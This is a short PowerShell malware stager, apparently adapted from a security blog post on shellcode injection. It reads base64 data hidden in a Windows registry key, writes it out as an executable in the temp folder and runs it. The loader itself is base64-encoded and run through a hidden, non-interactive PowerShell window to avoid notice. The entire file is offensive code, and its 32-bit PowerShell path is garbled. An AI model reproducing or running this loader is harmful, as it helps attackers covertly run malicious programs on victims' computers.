# based on https://www.trustedsec.com/may-2013/native-powershell-x86-shellcode-injection-on-64-bit-platforms/ 

$shellcode_string='
$key="HKCU:\Software\Microsoft\Windows\CurrentVersion";
$key_val=(Get-Item -Path $key).Property;
foreach($value in $key_val){[string]$b64+=(Get-Item -Path $key).GetValue($value)};
$ByteArray=[System.Convert]::FromBase64String($b64);
[string]$FilePath=(Join-Path -Path $env:TEMP -ChildPath ([system.guid]::NewGuid().ToString()+".exe"));
[System.IO.File]::WriteAllBytes($FilePath, $ByteArray);
$TargetFile=Write-Output -InputObject (Get-Item -Path $FilePath);
Start-Process -FilePath $TargetFile.FullName;'

$goat=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($shellcode_string));
if($env:PROCESSOR_ARCHITECTURE -eq "AMD64"){
	$powershellx86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell.exe";
	$cmd = "-noprofile -windowstyle hidden -noninteractive -EncodedCommand";
	iex "& $powershellx86 $cmd $goat";
}else{
	$cmd = "-noprofile -windowstyle hidden -noninteractive -EncodedCommand";
	iex "& powershell $cmd $goat";}
